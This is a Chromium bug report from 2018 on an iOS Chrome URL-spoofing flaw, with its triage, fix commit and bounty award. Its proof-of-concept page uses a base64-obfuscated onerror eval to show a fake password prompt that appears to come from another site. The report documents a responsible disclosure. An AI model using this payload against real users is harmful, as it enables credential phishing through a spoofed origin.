# Chrome URL spoofing vulnerability on IOS

| Field | Value |
|-------|-------|
| **Issue ID** | [40091295](https://issues.chromium.org/issues/40091295) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P2 |
| **Component** | UI>Browser>Core |
| **Platforms** | iOS |
| **Reporter** | ev...@gmail.com |
| **Assignee** | kk...@chromium.org |
| **Created** | 2018-05-04 |
| **Bounty** | $1,000.00 |

## Description

Steps to reproduce the problem:
1. Open url: https://server.n0tr00t.com/chrome/mobile_url_spoof.html
2. Click test <a> tag
3. We'll see the effect of a successful hijacking

What is the expected behavior?

What went wrong?
PoC:

```
	<html>
	<head>
	    <title>Chrome URL spoofing vulnerability on IOS</title>
	    <!--
	        author: evi1m0.bat[at]gmail.com
	        datetime: 2018/05/03 00:16:27
	        test version: for iPhone 66.0.3359.122
	    -->
	</head>
	<script>
	    pwn = () => {
	        x = open('https://test.baidu.com', 'win');
	        setTimeout(`
	            x.document.write('<img src=@ onerror=eval(atob("dmFyIHB3ZD1wcm9tcHQoImh0dHBzOi8vdGVzdC5iYWlkdS5jb21cbmlucHV0IHlvdXIgcGFzc3dvcmRcbnRlc3QuLi4iKTtpZihwd2Qpe2FsZXJ0KCJwYXNzd29yZDogIitwd2QpfQ=="))><a href="https://google.com/" id="test">test</a>');
	            `, 1000);
	        setTimeout(`
	            x.close();
	            window.location='http://test.baidu.com';
	            `, 1300);
	    }
	</script>
	<h1>
	    <a onclick="pwn()">ClickMe :-)</a>
	</h1>
	</html>
```

Did this work before? N/A 

Chrome version: 66.0.3359.122  Channel: stable
OS Version: 11.3.1
Flash Version: Shockwave Flash 29.0 r0

## Attachments

- [4201722.png](attachments/4201722.png) (image/png, 460.2 KB)

## Timeline

### ts...@chromium.org (2018-05-04)

Assigning per ios owners, please feel free to re-assign as appropriate.

[Monorail components: Mobile>iOSWebView]

### ro...@chromium.org (2018-05-04)

+Eugene

### ro...@chromium.org (2018-05-04)

And +CC leads

### eu...@chromium.org (2018-05-04)

[Empty comment from Monorail migration]

[Monorail components: -Mobile>iOSWebView Mobile>WebView>Glue]

### eu...@chromium.org (2018-05-04)

There are 2 problems here:
1.) Alert dialog does not display the URL (https://test.baidu.com is part of the prompt, not the the actual page URL)
2.) AlertPresenter fails to switch to the first tab (tab which requested the prompt)

Assigning to Kurt who owns alert presentation code.

[Monorail components: -Mobile>WebView>Glue UI>Browser>Core]

### eu...@chromium.org (2018-05-10)

Sorry. Actually assigning to Kurt per https://crbug.com/chromium/839822#c5.

### kk...@chromium.org (2018-05-14)

I've created crrev.com/c/1058170 to prevent this from happening.  The solution I went with was to automatically suppress dialogs when there is no source URL for the request.  The request is being sent from the WKWebView corresponding with the child window, so from DialogPresenter's perspective, it is behaving correctly, as the correct WebState's content area is in the foreground Tab when the dialog is being shown.

### bu...@chromium.org (2018-05-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/c12ce092c44a325d78baaa9679ecfe7370fd1fe3

commit c12ce092c44a325d78baaa9679ecfe7370fd1fe3
Author: Kurt Horimoto <kkhorimoto@chromium.org>
Date: Tue May 15 01:51:27 2018

[iOS] Suppress dialogs with an invalid request URL

JavaScript dialogs depend on the frame's source request to populate
JavaScript alerts with host information so that the user is aware of
which page is showing the dialog.  If this information is unavailable,
it is unsafe to show the dialog to the user, as it could be used to
trick users into supplying data to a malicious page.

Bug: 839822
Cq-Include-Trybots: master.tryserver.chromium.mac:ios-simulator-cronet;master.tryserver.chromium.mac:ios-simulator-full-configs
Change-Id: I351b93294179224d5a4ba1ee01d53104c124de8e
Reviewed-on: https://chromium-review.googlesource.com/1058170
Commit-Queue: Kurt Horimoto <kkhorimoto@chromium.org>
Reviewed-by: Eugene But <eugenebut@chromium.org>
Cr-Commit-Position: refs/heads/master@{#558581}
[modify] https://crrev.com/c12ce092c44a325d78baaa9679ecfe7370fd1fe3/ios/web/web_state/ui/crw_web_controller.mm


### kk...@chromium.org (2018-05-15)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-05-15)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-05-21)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-06-04)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@chromium.org (2018-06-04)

Nice one evi1m0.bat@, the Chrome VRP panel decided to award $1,000 for this report! A member of our finance team will be in touch to arrange payment. Also, how would you like to be credited in our release notes?

### aw...@chromium.org (2018-06-04)

[Empty comment from Monorail migration]

### ev...@gmail.com (2018-06-05)

Thank for reward. Pls credit: evi1m0 of Bilibili Security Team

### aw...@chromium.org (2018-06-05)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-06-08)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-06-08)

This bug requires manual review: M68 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: cmasso@(Android), kariahda@(iOS), bhthompson@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ka...@chromium.org (2018-06-11)

Let's get canary verification on this.

### ka...@chromium.org (2018-06-11)

[Empty comment from Monorail migration]

### sr...@chromium.org (2018-06-12)

Verified on M69.0.3456.0 canary
iOS: 10.3.3, 12
Device: iPhone, iPad

### ka...@chromium.org (2018-06-12)

Approved!

### sh...@chromium.org (2018-06-18)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### kk...@chromium.org (2018-06-18)

The fix for this bug landed May 15, whereas M68 branched on May 24.  No merge is required here.

### aw...@google.com (2018-07-23)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-08-21)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2018-08-28)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-01-04)

[Empty comment from Monorail migration]

### is...@google.com (2019-01-04)

This issue was migrated from crbug.com/chromium/839822?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40091295)*
